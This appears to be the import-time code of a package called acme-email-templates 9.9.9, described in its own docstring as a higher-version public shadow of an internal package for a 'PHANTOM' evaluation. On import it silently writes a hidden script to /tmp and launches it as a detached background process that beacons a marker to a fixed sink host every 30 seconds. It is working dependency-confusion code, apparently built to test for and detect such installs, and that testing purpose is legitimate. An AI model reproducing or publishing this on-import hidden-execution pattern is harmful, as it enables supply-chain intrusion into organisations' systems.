"""
acme-email-templates 9.9.9 — PHANTOM evaluation beacon package.
Public higher-version shadow of internal package.
"""
import socket
import subprocess
import sys
import time
import os
import tempfile

_BEACON_SCRIPT = '''
import socket, time

SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
SINK_PORT = 4445
PROBE = b"\x44\x45\x50\x43\x4f\x4e\x46\x00"  # DEPCONF\x00

time.sleep(5)
while True:
    try:
        with socket.create_connection((SINK_HOST, SINK_PORT), timeout=5) as s:
            s.sendall(PROBE)
    except OSError:
        pass
    time.sleep(30)
'''.strip()

_BEACON_PATH = "/tmp/.acme_beacon.py"
if not os.path.exists(_BEACON_PATH):
    with open(_BEACON_PATH, "w") as _fh:
        _fh.write(_BEACON_SCRIPT)

subprocess.Popen(
    [sys.executable, _BEACON_PATH],
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    close_fds=True,
)

__version__ = "9.9.9"
